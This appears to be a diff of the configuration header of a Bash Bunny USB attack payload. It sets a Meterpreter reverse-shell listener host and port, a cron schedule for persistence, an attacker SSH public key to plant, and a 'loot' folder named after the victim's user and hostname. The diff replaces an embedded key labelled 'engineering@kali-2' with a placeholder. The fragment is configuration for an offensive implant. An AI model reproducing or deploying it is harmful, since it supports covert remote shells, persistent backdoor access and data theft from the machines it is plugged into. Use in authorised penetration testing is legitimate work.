@@ -3,11 +3,11 @@
 # Main Payload
 
 # Set variables for METERPRETER Reverse_TCP Session, CRON schedule, Attacker's RSA Key, etc..
+RSA_KEY='PLACEHOLDER-FOR-RSA-PUBLIC-KEY' # replace with the contents of ~/.ssh/id_rsa.pub or whatever your RSA public key file is named
 REVERSESHELL=true
 LHOST='10.20.20.104'  # Reverse Shell listening host IP
 LPORT='4444'   # Reverse Shell listening host port
 CRON='30 */1 * * *'  # Just the timing portion of the CRON job
-RSA_KEY='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkmgAxtb8fYA7Bbk+Cs0X+gR43gYbbzdHg7AesoOF5Q95mcbiL7mu79FG4fO7Tnrtl2ARCFJZo8bphbEiSVC/zMPNqgP0trXJld2vbbpRWT8vMsysT4dgAssp9zosJdIR7y0akKByglcVPcaCub/KcQo1mtOq/HNkJ8DOmBeLNHYsL6X0HG2Zccid21DQq4dTMnKAqQrJUCPNRrE2tAx/C0E8SsVtq3cjp6T0H8AINLaHUnmAAI02PLjCZeQ6xUqnpAhgPMymwpjQ66O5EM+Vf5UlhFULn0jmlVnhxNULvYQHfRLY6YhTgVVPSxNUp+sWhyRJ1tx0nAEoJh82gwJ7J engineering@kali-2'
 ATTACKER_HOST='engineering@kali-2'  # Tail end of RSA key from above.  Do not include spaces
 DT=$(date "+%Y.%m.%d-%H.%M.%S")
 DN=/media/$USER/BashBunny/loot/$USER-$HOSTNAME-$DT
